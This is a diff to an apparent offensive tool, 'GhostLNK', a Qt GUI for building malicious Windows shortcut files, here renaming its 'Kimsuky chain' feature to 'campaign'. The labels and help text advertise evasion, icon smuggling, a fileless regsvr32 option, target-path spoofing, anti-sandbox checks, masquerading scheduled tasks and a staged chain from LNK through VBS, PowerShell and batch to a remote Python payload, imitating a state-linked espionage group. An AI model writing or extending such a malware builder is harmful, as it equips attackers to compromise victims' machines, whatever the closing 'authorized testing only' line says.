@@ -84,7 +84,7 @@ class GhostLNKGUI(QMainWindow):
         credit.setStyleSheet("color: #FFFF00; font-size: 12px; font-weight: bold; font-family: 'Courier New', monospace;")
         left_layout.addWidget(credit)
 
-        subtitle = QLabel("Dropbox: &dl=1 | STEALTH | HIDE | RAW TARGET | EVASION | EMBED | APPEND | ICON SMUGGLING | SELF-EXTRACT | KIMSUKY CHAIN")
+        subtitle = QLabel("Dropbox: &dl=1 | STEALTH | HIDE | RAW TARGET | EVASION | EMBED | APPEND | ICON SMUGGLING | SELF-EXTRACT | KIMSUKY CAMPAIGN")
         subtitle.setAlignment(Qt.AlignmentFlag.AlignLeft)
         subtitle.setStyleSheet("color: #00FFFF; font-size: 10px; font-family: 'Courier New', monospace;")
         left_layout.addWidget(subtitle)
@@ -131,7 +131,7 @@ class GhostLNKGUI(QMainWindow):
 
         self.create_menu()
         self.log("GhostLNK initialized")
-        self.log("[OK] Kimsuky‑Style Multi‑Stage Chain added")
+        self.log("[OK] Kimsuky‑Style Multi‑Stage Campaign ready")
 
     def create_converter_panel(self):
         panel = QWidget()
@@ -445,10 +445,10 @@ class GhostLNKGUI(QMainWindow):
         self.multistage_widget.setVisible(False)
         evasion_layout.addWidget(self.multistage_widget)
 
-        # NEW: Kimsuky‑Style Multi‑Stage Chain
-        self.kimsuky_cb = QCheckBox("Kimsuky‑Style Multi‑Stage Chain")
+        # Kimsuky‑Style Multi‑Stage Campaign (separate from simple multistage)
+        self.kimsuky_cb = QCheckBox("Kimsuky‑Style Multi‑Stage Campaign")
         self.kimsuky_cb.setToolTip(
-            "Generate a complete multi‑stage attack chain:\n"
+            "Generate a complete fragmented attack package:\n"
             "LNK → XML (scheduled task) → VBS (decoy PDF) → PS1 (anti‑sandbox) → BAT → Python payload.\n"
             "All files are saved to a folder of your choice."
         )
@@ -945,9 +945,9 @@ End If
         return vbs
 
     def _build_kimsuky_chain(self, decoy_url: str, payload_url: str) -> dict:
-        """Generate all files for the Kimsuky‑style multi‑stage chain."""
+        """Generate all files for the Kimsuky‑style multi‑stage campaign."""
         folder_name = generate_random_folder_name()
-        task_name = f"GoogleUpdateTaskMachine{str(uuid.uuid4())[:8]}"
+        task_name = generate_task_name()
         ps1_filename = f"update_{random.randint(1000,9999)}.ps1"
         bat_filename = f"setup_{random.randint(100,999)}.bat"
 
@@ -1173,7 +1173,7 @@ Invoke-Expression $s
         self.mode_indicator.setStyleSheet("color: #00FF00; font-weight: bold;")
 
     # ----------------------------------------------------------------------
-    # Multi-Stage Stager
+    # Simple Multi-Stage Stager (original)
     # ----------------------------------------------------------------------
     def _build_multistage_ps(self):
         decoy = self.decoy_url.text().strip()
@@ -1236,10 +1236,10 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
                 decoy = self.kimsuky_decoy.text().strip()
                 payload = self.kimsuky_payload.text().strip()
                 if not decoy or not payload:
-                    QMessageBox.warning(self, "Warning", "Kimsuky chain requires Decoy PDF URL and Payload URL.")
+                    QMessageBox.warning(self, "Warning", "Kimsuky campaign requires Decoy PDF URL and Payload URL.")
                     return
                 chain = self._build_kimsuky_chain(decoy, payload)
-                folder = QFileDialog.getExistingDirectory(self, "Select folder to save Kimsuky chain files")
+                folder = QFileDialog.getExistingDirectory(self, "Select folder to save Kimsuky campaign files")
                 if not folder:
                     return
                 # Save all files
@@ -1255,7 +1255,7 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
                 arguments = ""
                 working_dir = None
                 appended_payload = None
-                self.log(f"[OK] Kimsuky chain saved to {folder}")
+                self.log(f"[OK] Kimsuky campaign saved to {folder}")
 
             else:
                 if self.multistage_cb.isChecked():
@@ -1496,7 +1496,7 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
             "<b>regsvr32.exe:</b> Fileless SCT/DLL execution.<br>"
             "<b>LNK Stomping:</b> Spoof displayed target path.<br>"
             "<b>Self-Extracting LNK (Hex):</b> Hex-encoded VBS appended; extracted and executed silently.<br>"
-            "<b>Kimsuky‑Style Chain:</b> LNK → XML → VBS → PS1 → BAT → Python (full campaign)."
+            "<b>Kimsuky Campaign:</b> LNK → XML → VBS → PS1 → BAT → Python (full fragmented chain)."
         )
 
     def show_embed_help(self):
@@ -1573,6 +1573,6 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
             "> Multi-Stage Stager (VBS + Scheduled Task)<br>"
             "> Embedded Payload with XOR, String Obfuscation, Append, Binary & True Icon Smuggling<br>"
             "> Self-Extracting LNK (Hex) — hex-encoded VBS for maximum evasion<br>"
-            "> Kimsuky‑Style Multi‑Stage Chain — full campaign generation<br>"
+            "> Kimsuky‑Style Multi‑Stage Campaign — full fragmented attack package<br>"
             "> Anti-Sandbox Checks<br><br>"
             "For authorized testing only")
